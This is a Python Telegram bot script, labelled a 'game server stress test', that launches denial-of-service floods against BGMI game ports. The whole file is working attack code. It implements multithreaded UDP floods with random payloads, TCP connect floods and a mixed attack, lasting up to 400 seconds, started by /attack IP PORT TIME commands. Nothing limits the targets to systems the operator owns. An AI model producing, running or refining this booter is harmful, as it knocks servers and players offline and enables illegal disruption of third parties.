import logging
import socket
import threading
import time
import random
import struct
import sys
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── CONFIG ─── YAHI APNI VALUES DALO ───
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ← YAHI APNA TOKEN DALO
AUTHORIZED_USERS = [123456789]     # ← YAHI APNA TELEGRAM ID DALO
MAX_TIME = 400

# BGMI ports range
GAME_PORTS = list(range(10000, 30001))

# ─── ATTACK ENGINE ───
class AttackEngine:
    def __init__(self):
        self.active_attacks = {}
    
    def udp_flood(self, ip, port, duration, stop_event):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end and not stop_event.is_set():
            try:
                for p in [port, port+1, port+2, port+5, port+10]:
                    data = random._urandom(random.randint(512, 1400))
                    sock.sendto(data, (ip, p))
            except:
                pass
        sock.close()
    
    def tcp_flood(self, ip, port, duration, stop_event):
        end = time.time() + duration
        while time.time() < end and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(random._urandom(1024))
                s.close()
            except:
                pass
    
    def mixed_attack(self, ip, port, duration, stop_event):
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end and not stop_event.is_set():
            try:
                for _ in range(5):
                    p = random.choice(GAME_PORTS[:100])
                    udp.sendto(random._urandom(1400), (ip, p))
                try:
                    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tcp.settimeout(0.5)
                    tcp.connect((ip, port))
                    tcp.close()
                except:
                    pass
            except:
                pass
        udp.close()
    
    def start(self, ip, port, duration, method="mixed", threads=300):
        stop_event = threading.Event()
        attack_id = f"{ip}:{port}-{int(time.time())}"
        
        for _ in range(threads):
            if method == "udp":
                t = threading.Thread(target=self.udp_flood, args=(ip, port, duration, stop_event), daemon=True)
            elif method == "tcp":
                t = threading.Thread(target=self.tcp_flood, args=(ip, port, duration, stop_event), daemon=True)
            else:
                t = threading.Thread(target=self.mixed_attack, args=(ip, port, duration, stop_event), daemon=True)
            t.start()
        
        self.active_attacks[attack_id] = stop_event
        return attack_id
    
    def stop_all(self):
        for attack_id in list(self.active_attacks.keys()):
            self.active_attacks[attack_id].set()
        self.active_attacks.clear()
        return True

engine = AttackEngine()

# ─── TELEGRAM HANDLERS ───
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    keyboard = [
        [InlineKeyboardButton("🌀 Mixed Attack (Best)", callback_data="method_mixed")],
        [InlineKeyboardButton("🔥 UDP Flood", callback_data="method_udp")],
        [InlineKeyboardButton("⚡ TCP Flood", callback_data="method_tcp")],
        [InlineKeyboardButton("🛑 Stop All", callback_data="stop_all")],
    ]
    
    await update.message.reply_text(
        "🎯 **GAME SERVER STRESS TEST BOT**\n\n"
        "Usage:\n"
        "`/attack IP PORT TIME`\n\n"
        "Example:\n"
        "`/attack 192.168.1.100 10010 120`\n\n"
        f"Max time: {MAX_TIME}s\n"
        "Select attack method below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: /attack IP PORT TIME")
        return
    
    ip = args[0]
    port = int(args[1])
    duration = min(int(args[2]), MAX_TIME)
    
    method = context.user_data.get("method", "mixed")
    threads = context.user_data.get("threads", 500)
    
    attack_id = engine.start(ip, port, duration, method, threads)
    
    msg = await update.message.reply_text(
        f"⚔️ **Attack Launched**\n"
        f"├ Target: `{ip}:{port}`\n"
        f"├ Method: `{method.upper()}`\n"
        f"├ Duration: `{duration}s`\n"
        f"├ Threads: `{threads}`\n"
        f"└ ID: `{attack_id}`",
        parse_mode="Markdown"
    )
    
    # Wait and show progress
    for i in range(duration):
        if i % 10 == 0:
            try:
                await msg.edit_text(
                    f"⚔️ **Attacking** `{ip}:{port}`\n"
                    f"├ Elapsed: `{i}s / {duration}s`\n"
                    f"├ Method: `{method.upper()}`\n"
                    f"├ Threads: `{threads}`\n"
                    f"└ Status: 🟢 **Running**",
                    parse_mode="Markdown"
                )
            except:
                pass
        time.sleep(1)
    
    await msg.edit_text(
        f"✅ **Attack Complete**\n"
        f"├ Target: `{ip}:{port}`\n"
        f"├ Duration: `{duration}s`\n"
        f"├ Method: `{method.upper()}`\n"
        f"└ Status: 🔴 **Finished**",
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "stop_all":
        engine.stop_all()
        await query.edit_message_text("🛑 All attacks stopped")
    
    elif data.startswith("method_"):
        method = data.replace("method_", "")
        context.user_data["method"] = method
        await query.edit_message_text(
            f"✅ Method set to: **{method.upper()}**\n\n"
            f"Now use:\n"
            f"`/attack IP PORT TIME`\n\n"
            f"Example: `/attack 192.168.1.100 10010 120`",
            parse_mode="Markdown"
        )

# ─── MAIN ───
def main():
    logging.basicConfig(level=logging.INFO)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Bot started! Send /start on Telegram")
    app.run_polling()

if __name__ == "__main__":
    main()
